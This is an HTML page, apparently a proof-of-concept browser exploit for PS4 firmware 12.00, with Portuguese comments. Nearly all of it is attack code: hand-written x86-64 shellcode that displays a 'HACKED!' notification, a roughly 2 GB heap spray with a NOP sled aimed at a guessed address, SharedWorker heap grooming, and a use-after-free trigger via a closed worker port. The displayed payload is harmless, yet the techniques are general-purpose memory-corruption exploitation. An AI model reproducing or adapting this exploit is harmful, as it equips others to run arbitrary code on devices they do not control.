<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <title>PS4 12.00 PoC (Notification)</title>
    
</head>
<body>

    <h1>PS4 12.00 Notificação PoC</h1>
    <h3>Estratégia: Fixed Address Spray (Blind)</h3>
    <div id="log"></div>
    <button onclick="go()">DISPARAR</button>

    <script>
        function log(msg) {
            var d = document.getElementById("log");
            d.innerHTML += `[${new Date().toLocaleTimeString()}] ${msg}<br>`;
            d.scrollTop = d.scrollHeight;
        }

        // =================================================================
        // 1. PAYLOAD: NOTIFICAÇÃO SIMPLES (Genérico PS4)
        // =================================================================
        // Este shellcode apenas chama syscalls para desenhar uma notificação.
        // Não precisa de offsets de Kernel complexos.
        var notify_shellcode = [
            0x48, 0x31, 0xC0, 0x48, 0x89, 0xC2, 0x48, 0x89, 0xC6, 0x48, 0x8D, 0x3D, 0x44, 0x00, 0x00, 0x00,
            0x48, 0xC7, 0xC0, 0x05, 0x00, 0x00, 0x00, 0x0F, 0x05, 0x48, 0x89, 0xC7, 0x48, 0x8D, 0x35, 0x45,
            0x00, 0x00, 0x00, 0x48, 0xC7, 0xC2, 0x30, 0x0C, 0x00, 0x00, 0x48, 0xC7, 0xC0, 0x04, 0x00, 0x00,
            0x00, 0x0F, 0x05, 0x48, 0x31, 0xC0, 0x48, 0xC7, 0xC0, 0x06, 0x00, 0x00, 0x00, 0x0F, 0x05, 0xC3,
            // "/dev/notification0" string
            0x2F, 0x64, 0x65, 0x76, 0x2F, 0x6E, 0x6F, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F,
            0x6E, 0x30, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            // Estrutura da Notificação (Mensagem: "HACKED")
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x48, 0x41, 0x43, 0x4B, 
            0x45, 0x44, 0x21, 0x00 // "HACKED!"
        ];

        // =================================================================
        // 2. CONFIGURAÇÃO DE MEMÓRIA (SPRAY FIXO)
        // =================================================================
        // Vamos tentar alocar dados até atingir um endereço alto "chutado"
        // que colocaremos no ponteiro do objeto falso.
        var FAKE_VTABLE_PTR = 0x45000000; // Um endereço que tentaremos alcançar com o spray

        function prepare_payload() {
            var size = 0x400; // Tamanho que funcionou para você
            var buffer = new Uint32Array(size / 4);

            // NOP SLED (0x90) + Endereço de Retorno
            // Em vez de apontar para um gadget, apontamos para o meio do nosso próprio spray
            // Se o kernel pular para 0x45000000 e nosso spray estiver lá, ele executa.
            
            // 1. Inserir o Shellcode de Notificação
            var shellcode_u32 = [];
            for (var i = 0; i < notify_shellcode.length; i+=4) {
                var val = notify_shellcode[i] | (notify_shellcode[i+1] << 8) | (notify_shellcode[i+2] << 16) | (notify_shellcode[i+3] << 24);
                shellcode_u32.push(val);
            }

            // 2. Preencher o objeto com o Shellcode repetido (Nop Sled)
            for (var k = 0; k < buffer.length; k++) {
                // Repetir o shellcode a cada X bytes ou preencher com NOPs
                if (k < shellcode_u32.length) {
                    buffer[k] = shellcode_u32[k];
                } else {
                    buffer[k] = 0x90909090; // NOP
                }
            }
            
            // ATENÇÃO: O truque é que o próprio objeto contenha o código.
            // O Vtable Pointer (que o Kernel lê) deve apontar para o início deste buffer.
            
            return buffer;
        }

        // =================================================================
        // 3. EXECUÇÃO
        // =================================================================
        var workers = [];
        var heap_spray = [];

        async function go() {
            log("Iniciando...");
            
            // 1. HUGE HEAP SPRAY (Tentar cobrir o endereço 0x45000000)
            log("Enchendo a RAM com Shellcode (Isso pode demorar)...");
            var payload = prepare_payload();
            
            // Criar muitos arrays grandes para forçar o JS a usar memória alta
            try {
                for(let i=0; i < 2048; i++) { // ~2GB de Spray se cada chunk for 1MB
                    // Usamos ArrayBuffer para ocupar espaço bruto
                    let ab = new ArrayBuffer(1024 * 1024); // 1MB
                    let view = new Uint32Array(ab);
                    // Copiar payload repetidamente
                    for(let j=0; j < view.length; j+= payload.length) {
                        view.set(payload, j);
                    }
                    heap_spray.push(view);
                    if(i % 500 == 0) log("Spray: " + i + "MB");
                }
            } catch(e) { log("Memória cheia (Bom sinal)."); }

            // 2. GROOMING
            log("Criando Workers (400)...");
            for(let i=0; i<400; i++) {
                try {
                    let w = new SharedWorker("data:text/javascript,1", "g"+i);
                    w.port.start();
                    workers.push(w);
                } catch(e){}
            }

            // 3. TRIGGER (404)
            log("Aplicando Pressão Final...");
            var count = 0;
            var it = setInterval(() => {
                if(count >= 4) {
                    clearInterval(it);
                    
                    log("!!! DISPARANDO !!!");
                    var v = workers.pop();
                    v.port.close(); // Free
                    
                    // Spray cirúrgico no buraco
                    var fast_spray = [];
                    for(let k=0; k<5000; k++) {
                        fast_spray.push(new Uint32Array(payload));
                    }
                    
                    // Trigger
                    try { v.port.postMessage("PWN"); } catch(e){}
                    
                    log("Verifique se apareceu a notificação 'HACKED!'.");
                    return;
                }
                
                let w = new SharedWorker("data:text/javascript,1", "v"+count);
                w.port.start();
                workers.push(w);
                count++;
            }, 150);
        }
    </script>
</body>
</html>
